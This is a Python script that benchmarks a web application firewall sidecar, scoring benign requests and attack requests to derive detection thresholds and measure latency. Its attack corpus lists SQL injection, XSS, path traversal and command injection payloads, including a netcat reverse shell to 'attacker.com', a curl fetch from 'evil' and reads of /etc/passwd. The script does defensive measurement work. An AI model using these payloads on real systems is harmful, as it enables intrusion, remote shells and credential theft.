#!/usr/bin/env python3
"""Measure S1's detection-vs-false-positive curve and derive thresholds.

This is the Phase 3 exit gate. Every threshold downstream of S1 derives from
the curve this produces; the build spec forbids magic thresholds, so tau_low
and tau_high must come from here.

What it does
------------
1. Builds a labelled corpus of benign and attack requests.
2. Sends every one through the real CRS sidecar and records the score.
3. Sweeps the threshold and reports detection rate vs false-positive rate.
4. Derives tau_low (the escalation floor) and tau_high (the block ceiling)
   from the measured curve at a target FPR.
5. Measures per-request latency, including the IPC hop.

⚠ CORPUS LIMITATION — read before quoting any number from this script.
The corpus here is hand-built and small. It is adequate to (a) prove the
pipeline works end to end, (b) establish that benign and attack scores
separate at all, and (c) produce provisional thresholds so S2/S3 development
can proceed. It is NOT adequate to characterise real-world FPR, because
real benign traffic is far more varied and weird than anything written by
hand. Phase 4 replaces it with CSIC 2010, ECML/PKDD 2007 and captured traffic
from our own applications, and these numbers must be re-derived then.
"""

from __future__ import annotations

import argparse
import json
import statistics
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import httpx  # noqa: E402


@dataclass
class Sample:
    label: str  # "benign" or an attack class
    method: str
    path: str
    query: str
    body: str = ""
    content_type: str = ""


UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"


def q(**params: str) -> str:
    return "&".join(f"{k}={quote(v, safe='')}" for k, v in params.items())


def benign_corpus() -> list[Sample]:
    """Ordinary application traffic, including values that LOOK dangerous.

    The hard cases are deliberate: free-text search containing SQL keywords,
    apostrophes in names, comparison operators, code snippets, file paths.
    These are where signature WAFs generate their false positives, and the
    whole argument for the cascade rests on not blocking them.
    """
    searches = [
        "desk lamp", "SELECT desk lamp", "union jack flag", "O'Brien",
        "user's guide", "drop table mountain", "C++ programming",
        "1 + 1 = 2", "price > 100", "50% off", "a & b", "naïve café",
        "order by date", "insert coin", "delete account help",
        "<3 this product", "foo--bar", "path/to/file", "shell script",
        "exec summary", "script writing course", "alert me when in stock",
    ]
    samples = [
        Sample("benign", "GET", "/api/search", q(q=s, page="1")) for s in searches
    ]
    samples += [
        Sample("benign", "GET", "/api/products", q(category="home", sort="price_asc")),
        Sample("benign", "GET", "/api/products/12345", ""),
        Sample("benign", "GET", "/api/users/me", ""),
        Sample("benign", "GET", "/api/orders", q(status="shipped", limit="50")),
        Sample("benign", "GET", "/health", ""),
        Sample("benign", "GET", "/api/items", q(ids="1,2,3,4,5")),
        Sample("benign", "GET", "/api/report", q(start="2026-01-01", end="2026-10-01")),
        Sample("benign", "GET", "/api/search", q(q="email@example.com")),
        Sample("benign", "GET", "/api/geo", q(lat="19.0760", lon="72.8777")),
        Sample("benign", "GET", "/api/i18n", q(text="Grüße aus München")),
    ]
    bodies = [
        ('{"name":"Alice O\'Brien","email":"a@example.com","age":30}', "application/json"),
        ('{"query":"desk lamp","filters":{"price_max":100},"sort":"relevance"}', "application/json"),
        ('{"comment":"Great product! 5/5 would buy again."}', "application/json"),
        ('{"sql_tutorial_progress":{"lesson":"SELECT basics","done":true}}', "application/json"),
        ('{"code":"function add(a,b){return a+b}"}', "application/json"),
        ('{"path":"/usr/local/bin/tool","args":["--verbose"]}', "application/json"),
        ("name=Bob&message=Hello%20there", "application/x-www-form-urlencoded"),
        ("title=My%20Blog%20Post&tags=tech,python", "application/x-www-form-urlencoded"),
    ]
    samples += [
        Sample("benign", "POST", "/api/submit", "", body, ctype)
        for body, ctype in bodies
    ]
    return samples


def attack_corpus() -> list[Sample]:
    """Attack payloads across the classes CSF claims to cover."""
    sqli = [
        "1' OR '1'='1", "1 UNION SELECT NULL,NULL--", "admin'--",
        "1; DROP TABLE users--", "1' AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1 OFFSET 1--", "1 UNION ALL SELECT @@version--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "1'/**/OR/**/1=1", "1 /*!UNION*/ /*!SELECT*/ 1",
        "1' oR '1'='1", "0x31 OR 1=1",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "') OR ('a'='a", "1' UNION SELECT username,password FROM users--",
    ]
    xss = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)", "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<a href=\"javascript:alert(1)\">x</a>",
        "<ScRiPt>alert(1)</ScRiPt>", "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
    ]
    cmdi = [
        ";cat /etc/passwd", "| whoami", "`id`", "$(uname -a)",
        "; nc -e /bin/sh attacker.com 4444", "&& curl http://evil/x",
        "|| ping -c 10 127.0.0.1", "; rm -rf /tmp/x",
    ]
    traversal = [
        "../../../etc/passwd", "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "/var/www/../../etc/shadow",
        "..\\..\\windows\\win.ini",
    ]
    samples: list[Sample] = []
    samples += [Sample("sqli", "GET", "/api/items", q(id=p)) for p in sqli]
    samples += [Sample("xss", "GET", "/api/search", q(q=p)) for p in xss]
    samples += [Sample("cmdi", "GET", "/api/ping", q(host=p)) for p in cmdi]
    samples += [Sample("traversal", "GET", "/api/file", q(name=p)) for p in traversal]
    # The same classes delivered in a JSON body, which some deployments miss.
    samples += [
        Sample("sqli", "POST", "/api/query", "",
               json.dumps({"filter": p}), "application/json")
        for p in sqli[:5]
    ]
    samples += [
        Sample("xss", "POST", "/api/comment", "",
               json.dumps({"text": p}), "application/json")
        for p in xss[:5]
    ]
    return samples


def evaluate(client: httpx.Client, sample: Sample, index: int) -> dict:
    headers = {"Host": ["app.local"], "User-Agent": [UA],
               "Accept": ["application/json"]}
    if sample.content_type:
        headers["Content-Type"] = [sample.content_type]
    payload = {
        "id": str(index),
        "method": sample.method,
        "path": sample.path,
        "query": sample.query,
        "headers": headers,
        "body": sample.body,
    }
    started = time.perf_counter()
    response = client.post("/eval", json=payload)
    response.raise_for_status()
    elapsed_us = (time.perf_counter() - started) * 1e6
    data = response.json()
    data["_client_us"] = elapsed_us
    return data


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--socket", default="/tmp/csf-s1.sock")  # noqa: S108
    parser.add_argument("--out", default="../docs/benchmarks/s1-baseline.json")
    parser.add_argument("--target-fpr", type=float, default=0.0,
                        help="FPR to derive tau_high at (0 = no false positives)")
    args = parser.parse_args()

    client = httpx.Client(
        transport=httpx.HTTPTransport(uds=args.socket),
        base_url="http://s1", timeout=10.0,
    )
    try:
        client.get("/healthz").raise_for_status()
    except httpx.HTTPError as exc:
        print(f"fatal: S1 sidecar unreachable at {args.socket}: {exc}", file=sys.stderr)
        print("start it with: ./s1-sidecar -crs vendor/crs", file=sys.stderr)
        return 1

    benign = benign_corpus()
    attacks = attack_corpus()
    print(f"corpus: {len(benign)} benign, {len(attacks)} attack "
          f"({len(benign) + len(attacks)} total)")

    results = []
    for i, sample in enumerate(benign + attacks):
        data = evaluate(client, sample, i)
        results.append({
            "label": sample.label,
            "detection": data["anomaly_score"],
            "blocking": data["blocking_score"],
            "categories": data.get("categories") or [],
            "actionable_rules": len(data.get("matched_rules") or []),
            "engine_us": data["elapsed_us"],
            "client_us": data["_client_us"],
        })

    benign_scores = [r["detection"] for r in results if r["label"] == "benign"]
    attack_rows = [r for r in results if r["label"] != "benign"]
    attack_scores = [r["detection"] for r in attack_rows]

    print("\n=== score distribution (detection score) ===")
    def describe(name, values):
        if not values:
            return
        vals = sorted(values)
        print(f"  {name:<10} n={len(vals):<4} min={vals[0]:<4} "
              f"p50={vals[len(vals)//2]:<4} p95={vals[int(len(vals)*0.95)]:<4} "
              f"max={vals[-1]:<4} mean={statistics.mean(vals):.1f}")
    describe("benign", benign_scores)
    describe("attack", attack_scores)
    for cls in sorted({r["label"] for r in attack_rows}):
        describe(cls, [r["detection"] for r in attack_rows if r["label"] == cls])

    print("\n=== threshold sweep (detection score) ===")
    print(f"  {'thresh':>7} {'detect%':>9} {'FPR%':>8} {'missed':>7} {'false+':>7}")
    thresholds = sorted({0, 1, 2, 3, 5, 8, 10, 15, 20, 25, 30, 35, 40, 45, 50, 60, 80})
    sweep = []
    for t in thresholds:
        tp = sum(1 for s in attack_scores if s >= t)
        fp = sum(1 for s in benign_scores if s >= t)
        det = tp / len(attack_scores) * 100 if attack_scores else 0.0
        fpr = fp / len(benign_scores) * 100 if benign_scores else 0.0
        sweep.append({"threshold": t, "detection_pct": det, "fpr_pct": fpr,
                      "missed": len(attack_scores) - tp, "false_positives": fp})
        print(f"  {t:>7} {det:>8.1f}% {fpr:>7.1f}% {len(attack_scores)-tp:>7} {fp:>7}")

    # Derive thresholds from the measured curve.
    # tau_high: the lowest threshold achieving the target FPR. Above it we
    # block outright, so it must be a score benign traffic does not reach.
    eligible = [s for s in sweep if s["fpr_pct"] <= args.target_fpr * 100]
    tau_high = min((s["threshold"] for s in eligible), default=max(thresholds))
    # tau_low: the escalation floor. Anything scoring above this is ambiguous
    # enough to deserve S2/S3. Set just below the lowest attack score so no
    # attack is forwarded without a second opinion.
    tau_low = max(0, min(attack_scores) - 1) if attack_scores else 0

    detect_at_high = next(s["detection_pct"] for s in sweep if s["threshold"] == tau_high)
    escalated_benign = sum(1 for s in benign_scores if s > tau_low)
    escalated_attacks = sum(1 for s in attack_scores if tau_low < s < tau_high)

    print("\n=== derived thresholds (MEASURED, not chosen) ===")
    print(f"  tau_low  = {tau_low:<4} (escalation floor; lowest attack score "
          f"was {min(attack_scores) if attack_scores else 0})")
    print(f"  tau_high = {tau_high:<4} (block ceiling at <= {args.target_fpr*100:.1f}% FPR; "
          f"catches {detect_at_high:.1f}% of attacks outright)")
    print(f"  escalation to S2/S3: {escalated_benign}/{len(benign_scores)} benign "
          f"({escalated_benign/len(benign_scores)*100:.1f}%), "
          f"{escalated_attacks}/{len(attack_scores)} attacks")

    engine = [r["engine_us"] for r in results]
    client_us = [r["client_us"] for r in results]
    engine.sort(); client_us.sort()
    ipc = statistics.mean(client_us) - statistics.mean(engine)
    print("\n=== latency (includes the IPC hop ADR-0001 refused unmeasured) ===")
    print(f"  CRS engine   p50={engine[len(engine)//2]:>8.0f}us  "
          f"p95={engine[int(len(engine)*0.95)]:>8.0f}us  p99={engine[-1]:>8.0f}us")
    print(f"  end-to-end   p50={client_us[len(client_us)//2]:>8.0f}us  "
          f"p95={client_us[int(len(client_us)*0.95)]:>8.0f}us  p99={client_us[-1]:>8.0f}us")
    print(f"  IPC overhead ~{ipc:.0f}us mean ({ipc/statistics.mean(client_us)*100:.0f}% of total)")

    out = Path(__file__).resolve().parent / args.out
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps({
        "measured_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "corpus": {"benign": len(benign), "attack": len(attacks),
                   "note": "hand-built; provisional. Phase 4 replaces with "
                           "CSIC 2010 / ECML-PKDD 2007 / captured traffic."},
        "sweep": sweep,
        "derived": {"tau_low": tau_low, "tau_high": tau_high,
                    "target_fpr": args.target_fpr},
        "latency_us": {
            "engine_p50": engine[len(engine)//2],
            "engine_p95": engine[int(len(engine)*0.95)],
            "end_to_end_p50": client_us[len(client_us)//2],
            "end_to_end_p95": client_us[int(len(client_us)*0.95)],
            "ipc_mean": ipc,
        },
        "results": results,
    }, indent=2))
    print(f"\nwrote {out}")
    client.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
